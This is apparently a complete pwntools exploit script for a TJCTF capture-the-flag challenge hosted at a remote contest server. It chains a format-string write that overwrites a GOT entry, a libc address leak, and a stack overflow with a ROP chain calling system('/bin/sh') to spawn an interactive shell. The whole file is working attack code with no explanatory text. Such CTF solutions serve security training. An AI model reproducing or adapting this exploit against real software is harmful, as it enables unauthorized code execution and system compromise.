from pwn import *

def main():
        live = True
        context.clear(arch = 'amd64')
        if not live:
                p = process("./super")
                gdb.attach(p)
        else:
                p = remote("problem1.tjctf.org", 8009)

        pwd = "cool"
        printf_got = 0x602048
        memset_got = 0x602050
        fgets_got = 0x602068
        strcmp_got = 0x602070
        pop_rdi_ret = 0x400f93

        # 1. Patch memset
        print p.recvuntil(">")
        p.sendline("s")
        print p.recvuntil(":")
        p.sendline(pwd)

        # str at 26
        payload = "%3832c"
        payload += "%28$hn"+"\x00"*4
        payload += p64(memset_got)
        print p.recvuntil(":")
        p.sendline(payload)

        print p.recvuntil(">")
        p.sendline("v")

        print p.recvuntil(":")
        p.sendline(pwd)

        p.recvuntil("Captcha")
        p.sendline("fucku")

        # 2. Leak libc
        print p.recvuntil(">")
        p.sendline("s")
        print p.recvuntil(":")
        p.sendline(pwd)

        payload = "%28$s%29$s"+"\x00"*6
        payload += p64(printf_got)
        payload += p64(fgets_got)

        print p.recvuntil(":")
        p.sendline(payload)

        print p.recvuntil(">")
        p.sendline("v")

        print p.recvuntil(":")
        p.sendline(pwd)

        leak = (p.recvuntil("As"))
        print hexdump(leak)
        leak = leak[38:]

        printf_leak = u64(leak[0:6].ljust(8,"\x00"))
        fgets_leak = u64(leak[6:12].ljust(8,"\x00"))

        if not live:
                libc_base = printf_leak - 0x6dad0
                system = libc_base + 0x045390
                str_bin_sh = libc_base + 0x18cd57
        else:
                libc_base = printf_leak - 0x64e80
                system = libc_base + 0x04f440
                str_bin_sh = libc_base + 0x1b3e9a

        print "printf: %s" % hex(printf_leak)
        print "fgets: %s" % hex(fgets_leak)
        print "libc base: %s" % hex(libc_base)

        p.recvuntil("Captcha")
        p.sendline("fucku")

        # 3. goto system
        print p.recvuntil(">")
        p.sendline("s")
        print p.recvuntil(":")
        p.sendline(pwd)


        # use fgets in main to smash the stack
        #payload = "%2446c"
        payload = "%3579c"
        payload += "%28$hn"+"\x00"*4
        payload += p64(memset_got)

        print p.recvuntil(":")
        p.sendline(payload)

        p.recvuntil(">")
        p.sendline("v")

        p.recvuntil(":")
        p.sendline(pwd)

        print "system: %s" % hex(system)
        print "/bin/sh: %s" % hex(str_bin_sh)

        p.sendline("A"*(16+6) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system))
        p.interactive()

if __name__ == "__main__":
        main()
